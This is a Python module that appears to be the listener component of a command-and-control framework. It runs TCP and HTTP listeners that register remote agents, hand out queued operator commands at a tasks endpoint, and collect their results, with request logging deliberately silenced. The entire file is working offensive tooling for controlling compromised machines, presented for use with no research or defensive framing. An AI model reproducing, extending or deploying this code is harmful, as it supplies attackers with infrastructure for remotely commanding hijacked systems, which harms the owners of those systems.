import socket
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from lib.session import VirtualSocket 

class C2HTTPHandler(BaseHTTPRequestHandler):
    """
    Handles HTTP requests from agents.
    """
    def log_message(self, format, *args):
        return # Silence logs
        
    def do_GET(self):
        # 1. Registration: GET /reg
        if self.path == '/reg':
            v_sock = VirtualSocket()
            client_ip = self.client_address
            # Use global session_manager passed via server object
            sid = self.server.session_manager.add_session(v_sock, client_ip, is_http=True)
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(str(sid).encode())
            print(f"\n[+] New HTTP Agent registered: Session {sid}")
            return

        # 2. Polling: GET /tasks/<sid>
        if self.path.startswith('/tasks/'):
            try:
                sid = int(self.path.split('/')[-1])
                session = self.server.session_manager.get_session(sid)
                
                if session and session['is_http']:
                    v_sock = session['socket']
                    if not v_sock.cmd_queue.empty():
                        cmd = v_sock.cmd_queue.get()
                        self.send_response(200)
                        self.end_headers()
                        self.wfile.write(cmd) 
                    else:
                        self.send_response(204) # No Content
                        self.end_headers()
                else:
                    self.send_error(404)
            except:
                self.send_error(500)

    def do_POST(self):
        # 3. Results: POST /results/<sid>
        if self.path.startswith('/results/'):
            try:
                sid = int(self.path.split('/')[-1])
                length = int(self.headers['Content-Length'])
                data = self.rfile.read(length)
                
                session = self.server.session_manager.get_session(sid)
                if session and session['is_http']:
                    session['socket'].resp_queue.put(data)
                    self.send_response(200)
                    self.end_headers()
                else:
                    self.send_error(404)
            except:
                self.send_error(500)

class ListenerManager:
    def __init__(self, session_manager):
        self.jobs = {}
        self.next_job_id = 0
        self.session_manager = session_manager

    def start_listener(self, protocol, port):
        """
        Returns: (success: bool, message: str)
        """
        # --- TCP LISTENER ---
        if protocol.lower() == 'tcp':
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.bind(("0.0.0.0", port))
                server.listen(5)
            except Exception as e:
                return False, f"Bind Error on {port}: {e}"

            t = threading.Thread(target=self._listen_loop_tcp, args=(server,))
            t.daemon = True
            t.start()
            
            self.jobs[self.next_job_id] = {'protocol': 'tcp', 'port': port, 'socket': server}
            msg = f"Job {self.next_job_id} started on TCP port {port}"
            self.next_job_id += 1
            print(f"[+] {msg}")
            return True, msg

        # --- HTTP LISTENER ---
        elif protocol.lower() == 'http':
            try:
                server = HTTPServer(('0.0.0.0', port), C2HTTPHandler)
                server.session_manager = self.session_manager 
            except Exception as e:
                return False, f"Bind Error on {port}: {e}"

            t = threading.Thread(target=server.serve_forever)
            t.daemon = True
            t.start()
            
            self.jobs[self.next_job_id] = {'protocol': 'http', 'port': port, 'socket': server}
            msg = f"Job {self.next_job_id} started on HTTP port {port}"
            self.next_job_id += 1
            print(f"[+] {msg}")
            return True, msg

        else:
            return False, "Protocol not supported."

    def _listen_loop_tcp(self, server_socket):
        while True:
            try:
                client, addr = server_socket.accept()
                sid = self.session_manager.add_session(client, addr, is_http=False)
                print(f"\n[+] New TCP Session {sid} from {addr[0]}")
            except:
                break

    def stop_job(self, job_id):
        if job_id in self.jobs:
            job = self.jobs[job_id]
            try:
                if job['protocol'] == 'tcp':
                    job['socket'].close()
                elif job['protocol'] == 'http':
                    job['socket'].shutdown()
                    job['socket'].server_close()
                del self.jobs[job_id]
                return True, "Job stopped."
            except Exception as e:
                return False, f"Error: {e}"
        return False, "Invalid Job ID"